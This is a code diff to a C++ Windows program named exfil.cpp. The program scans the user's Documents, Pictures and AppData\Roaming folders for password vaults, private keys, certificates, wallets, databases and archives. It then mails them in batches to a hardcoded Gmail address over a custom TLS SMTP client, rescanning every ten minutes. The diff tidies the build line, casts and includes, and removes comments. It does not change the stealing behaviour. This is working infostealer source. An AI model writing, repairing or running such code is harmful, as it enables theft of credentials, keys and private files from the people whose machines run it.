@@ -1,6 +1,8 @@
 // exfil.cpp — Windows user-profile file collector + Gmail SMTP exfil
-// build: cl /std:c++17 /EHsc exfil.cpp /link ws2_32.lib winhttp.lib secur32.lib crypt32.lib
-// требует app password gmail. implicit TLS (port 465). schannel handshake.
+// build: cl /EHsc /O2 /std:c++17 /Fe:app.exe exfil.cpp ws2_32.lib secur32.lib crypt32.lib
+#define SECURITY_WIN32
+#define WIN32_LEAN_AND_MEAN
+
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
@@ -11,11 +13,11 @@
 #include <wincrypt.h>
 #include <string>
 #include <vector>
-#include <fstream>
 #include <set>
 #include <thread>
 #include <chrono>
 #include <cstdio>
+#include <cctype>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "secur32.lib")
@@ -25,9 +27,9 @@
 static const char* MAIL_FROM = "sender@gmail.com";
 static const char* MAIL_PASS = "xxxxxxxxxxxxxxxx";    // 16-char app password
 static const char* MAIL_TO   = "temnij.lord322@gmail.com";
-static const DWORD SLEEP_BETWEEN_MAILS_MS = 30000;    // не спамить gmail
-static const DWORD SLEEP_SCAN_MS = 600000;            // пересканировать раз в 10 мин
-static const size_t MAX_ATTACH = 18u * 1024 * 1024;   // 18 МБ, чтобы влезть в письмо
+static const DWORD SLEEP_BETWEEN_MAILS_MS = 30000;
+static const DWORD SLEEP_SCAN_MS = 600000;
+static const size_t MAX_ATTACH = 18u * 1024 * 1024;
 // ======================================================
 
 // ---------- base64 ----------
@@ -89,13 +91,13 @@ struct TlsSock {
             SECPKG_CRED_OUTBOUND, nullptr, &sc, nullptr, nullptr, &cred, &ts) != SEC_E_OK)
             return false;
 
-        std::vector<char> inbuf; bool done = false;
         DWORD req = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT |
                     ISC_REQ_CONFIDENTIALITY | ISC_REQ_EXTENDED_ERROR |
                     ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM;
         SecBuffer out{}; out.BufferType = SECBUFFER_TOKEN;
         SecBufferDesc outd{ SECBUFFER_VERSION, 1, &out };
 
+        bool done = false;
         while (!done) {
             DWORD flags = req;
             SECURITY_STATUS ss = InitializeSecurityContextA(&cred, ctx.dwLower ? &ctx : nullptr,
@@ -106,7 +108,6 @@ struct TlsSock {
                     ::send(s, (const char*)out.pvBuffer, out.cbBuffer, 0);
                     FreeContextBuffer(out.pvBuffer);
                 }
-                // читать ответ сервера
                 std::vector<char> tmp(16384);
                 int n = recv(s, tmp.data(), (int)tmp.size(), 0);
                 if (n <= 0) return false;
@@ -131,7 +132,7 @@ struct TlsSock {
     bool send_all(const std::string& data) {
         size_t sent = 0;
         while (sent < data.size()) {
-            size_t chunk = min(data.size() - sent, sizes.cbMaximumMessage);
+            size_t chunk = min(data.size() - sent, (size_t)sizes.cbMaximumMessage);
             std::vector<char> buf(sizes.cbHeader + chunk + sizes.cbTrailer);
             memcpy(buf.data() + sizes.cbHeader, data.data() + sent, chunk);
             SecBuffer sb[4] = {};
@@ -181,6 +182,7 @@ struct TlsSock {
         if (ctx.dwLower) DeleteSecurityContext(&ctx);
         if (cred.dwLower) FreeCredentialsHandle(&cred);
         if (s != INVALID_SOCKET) closesocket(s);
+        ready = false;
     }
 };
 
@@ -189,18 +191,16 @@ struct Smtp {
     TlsSock tls;
     bool open(const char* host, const char* port) {
         if (!tls.connect(host, port)) return false;
-        tls.recv_line_blocking(5000); // banner 220
+        tls.recv_line_blocking(5000);
         return true;
     }
-    std::string cmd(const std::string& c, int code_ok = -1) {
+    std::string cmd(const std::string& c) {
         tls.send_all(c + "\r\n");
-        std::string r = tls.recv_line_blocking(8000);
-        (void)code_ok;
-        return r;
+        return tls.recv_line_blocking(8000);
     }
     bool auth() {
-        std::string r = cmd("EHLO localhost");
-        r = cmd("AUTH LOGIN");
+        cmd("EHLO localhost");
+        std::string r = cmd("AUTH LOGIN");
         if (r.substr(0,3) != "334") return false;
         r = cmd(b64(std::string(MAIL_FROM)));
         if (r.substr(0,3) != "334") return false;
@@ -227,15 +227,13 @@ struct Smtp {
             msg += "Content-Type: application/octet-stream; name=\"" + a.first + "\"\r\n";
             msg += "Content-Transfer-Encoding: base64\r\n";
             msg += "Content-Disposition: attachment; filename=\"" + a.first + "\"\r\n\r\n";
-            // base64 по 76 символов
             const std::string& raw = a.second;
             std::string enc = b64((const unsigned char*)raw.data(), raw.size());
-            for (size_t i = 0; i < enc.size(); i += 76) {
+            for (size_t i = 0; i < enc.size(); i += 76)
                 msg += enc.substr(i, 76) + "\r\n";
-            }
         }
         msg += "--" + boundary + "--\r\n";
-        // dot-stuffing
+
         std::string out; out.reserve(msg.size() + 16);
         size_t pos = 0;
         while (pos < msg.size()) {
@@ -262,7 +260,7 @@ bool interesting_ext(const std::string& ext) {
         ".kdbx",".key",".pem",".pfx",".p12",".wallet",".dat",
         ".zip",".rar",".7z",".sql",".db",".sqlite"
     };
-    std::string e; for (char c : ext) e.push_back((char)tolower(c));
+    std::string e; for (char c : ext) e.push_back((char)tolower((unsigned char)c));
     return s.count(e) > 0;
 }
 std::string ext_of(const std::string& p) {
@@ -275,7 +273,7 @@ std::string leaf(const std::string& p) {
 }
 
 void collect(const std::wstring& dir, std::vector<std::wstring>& out, int depth = 0) {
-    if (depth > 4) return; // не уходить слишком глубоко
+    if (depth > 4) return;
     WIN32_FIND_DATAW fd;
     HANDLE h = FindFirstFileW((dir + L"\\*").c_str(), &fd);
     if (h == INVALID_HANDLE_VALUE) return;
@@ -283,7 +281,6 @@ void collect(const std::wstring& dir, std::vector<std::wstring>& out, int depth 
         if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;
         std::wstring full = dir + L"\\" + fd.cFileName;
         if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-            // пропускаем системные
             if (fd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) continue;
             collect(full, out, depth + 1);
         } else {
@@ -315,7 +312,7 @@ std::string read_file(const std::wstring& p) {
 int main() {
     WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
     std::string hid = host_id();
-    std::set<std::string> sent_paths;   // не слать дважды в рамках сессии
+    std::set<std::string> sent_paths;
 
     for (;;) {
         std::vector<std::wstring> files;
@@ -324,7 +321,6 @@ int main() {
                                   L"\\Pictures", L"\\AppData\\Roaming" };
         for (auto s : subs) collect(std::wstring(up) + s, files);
 
-        // формируем пачки: не больше 3 файлов и 18 МБ суммарно на письмо
         Smtp mail; bool mail_open = false;
         std::vector<std::pair<std::string,std::string>> batch;
         size_t batch_bytes = 0;
